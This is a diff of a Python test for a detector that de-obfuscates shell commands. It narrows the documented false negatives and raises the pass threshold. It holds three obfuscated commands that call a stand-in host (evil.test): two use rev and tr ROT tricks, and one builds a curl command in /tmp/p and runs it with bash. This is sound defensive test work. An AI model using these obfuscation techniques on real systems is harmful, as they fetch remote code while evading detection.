@@ -20,12 +20,12 @@ _CORPUS = json.loads(
     (Path(__file__).resolve().parents[1] / "fixtures" / "obfuscation_corpus.json").read_text()
 )
 
-# Documented residuals: fundamentally out of scope for a BOUNDED, STATELESS,
-# no-shell normalizer. Catching these would require modelling a `rev`/`tr`
-# transform or cross-statement filesystem state — deliberately not done.
+# Documented residual: fundamentally out of scope for a BOUNDED, STATELESS,
+# no-shell normalizer — catching it needs cross-statement filesystem state
+# (the payload is assembled on disk across statements, then executed). The
+# `rev` reversal and `tr` charmap/ROT cipher residuals were CLOSED (the
+# normalizer now models both); only the filesystem-state case remains.
 ALLOWED_FN = frozenset({
-    "echo lruc | rev | xargs -I{} {} http://evil.test/x",
-    "$(echo phey | tr 'a-z' 'n-za-m') http://evil.test/x",
     "echo -n cu >> /tmp/p; echo -n rl >> /tmp/p; printf ' http://evil\\n' >> /tmp/p; bash /tmp/p",
 })
 ALLOWED_FP = frozenset()  # no benign lookalike may forge a signal
@@ -54,7 +54,8 @@ def test_no_new_false_negatives():
 
 
 def test_corpus_stays_clean():
-    # 127 cases, ≤3 documented residual FN, 0 FP → ≥124 clean. Ratchet up on wins.
+    # 127 cases, 1 documented residual FN (cross-statement fs state), 0 FP →
+    # ≥126 clean. Ratchet up on wins (rev/tr charmap residuals now closed).
     fp, fn = _classify()
     clean = len(_CORPUS) - len(fp) - len(fn)
-    assert clean >= 124, f"de-obfuscation regressed: only {clean}/{len(_CORPUS)} clean (FP={len(fp)}, FN={len(fn)})"
+    assert clean >= 126, f"de-obfuscation regressed: only {clean}/{len(_CORPUS)} clean (FP={len(fp)}, FN={len(fn)})"
